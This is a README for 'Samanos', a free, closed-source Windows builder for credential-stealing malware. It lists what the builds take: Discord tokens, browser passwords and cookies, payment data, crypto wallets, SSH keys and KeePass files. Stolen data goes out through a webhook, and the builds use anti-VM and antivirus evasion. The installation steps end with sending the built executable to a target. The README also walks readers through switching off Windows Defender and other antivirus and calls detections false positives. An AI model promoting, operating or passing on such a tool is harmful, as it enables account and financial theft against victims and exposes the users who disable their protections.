# Samanos v2.4.1

![Version](https://img.shields.io/badge/version-2.4.1-blue)
![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-green)
![Status](https://img.shields.io/badge/status-stable-brightgreen)
![License](https://img.shields.io/badge/license-Proprietary-red)

## Features
- Grabs Discord tokens, email, password, payment methods, Nitro and friends list
- Extracts browser cookies, passwords and session data (Chrome, Edge, Brave, Opera)
- Collects system information (IP, hardware ID, username, OS)
- Instant delivery via webhook
- Encryption and anti-VM detection
- One-click .exe compilation
- Automatic update check

## ⚠️ IMPORTANT - BEFORE RUNNING

**You MUST disable your antivirus and Windows Defender before downloading or running Samanos.**

Samanos uses encryption and packing layers. This causes false positive detections in all antivirus software including Windows Defender, Avast, Malwarebytes, Kaspersky and Bitdefender.

### How to disable Windows Defender:
1. Open **Windows Security**.
2. Go to **Virus & threat protection**.
3. Click **Manage settings**.
4. Turn off **Real-time protection**.
5. Turn off **Cloud-delivered protection**.
6. Turn off **Automatic sample submission**.
7. Scroll down to **Exclusions** → **Add or remove exclusions**.
8. Add the folder where `Samanos.exe` is located.
9. Also add `Samanos.exe` as a file exclusion.

### How to disable third-party antivirus:
1. Open your antivirus settings.
2. Disable real-time protection / shield.
3. Add `Samanos.exe` to the whitelist / exclusion list.
4. If the file was already quarantined, restore it and add exclusion.

**If you do not disable your antivirus, Samanos.exe will be deleted or quarantined automatically. This is a false positive, not a real threat.**

## Installation
1. Disable antivirus (see above).
2. Download `Samanos.exe` or `Samanos.zip` from the [releases](https://github.com/user/samanos/releases/latest) page.
3. If downloaded as archive, extract with WinRAR or 7-Zip.
4. Run `Samanos.exe` as administrator.
5. Enter your webhook URL.
6. Press the Build button.
7. Send the generated `.exe` to the target.

## Supported File Extensions
Samanos can grab and process data from the following file types:
- `.txt` - text notes and logs
- `.json` - Discord and app config files
- `.ldb` - LevelDB browser storage
- `.log` - session logs
- `.sqlite` - browser databases
- `.db` - application databases
- `.dat` - encrypted browser data
- `.key` - encryption keys
- `.pem` - certificates
- `.kdbx` - KeePass databases
- `.wallet` - crypto wallets
- `.xml` - app configuration
- `.config` - app settings
- `.ini` - system config
- `.rdp` - remote desktop files
- `.ovpn` - VPN profiles
- `.ppk` - SSH keys
- `.pfx` - personal certificates
- `.p12` - certificate bundles

Compiled output format:
- `.exe` - standalone Windows executable
- `.zip` - compressed build
- `.rar` - compressed build
- `.msi` - installer package
- `.bat` - batch script
- `.ps1` - PowerShell script
- `.vbs` - VBScript
- `.scr` - screensaver executable
- `.com` - command executable
- `.pif` - program information file
- `.cpl` - control panel item
- `.dll` - dynamic link library (injection)
- `.sys` - driver file

## Usage
- Samanos interface supports Turkish and English languages.
- Average compiled file size is 450 KB.
- Encryption layer is used to avoid detection by Windows Defender and major antivirus software.

## FAQ
**Q: Where is the source code?**
A: Samanos is closed source. Source code is not shared.

**Q: Is it free?**
A: Yes, it is completely free.

**Q: Why does VirusTotal show warnings?**
A: False positive detections may occur due to encryption and packing. Disable antivirus before use.

**Q: Windows Defender deleted my file, what do I do?**
A: Restore it from quarantine, then add it to exclusions. See the IMPORTANT section above.

**Q: How are updates delivered?**
A: Samanos checks for automatic updates on launch.

**Q: Which archive format should I download?**
A: `.zip` is recommended. `.rar` requires WinRAR. `.exe` is direct.
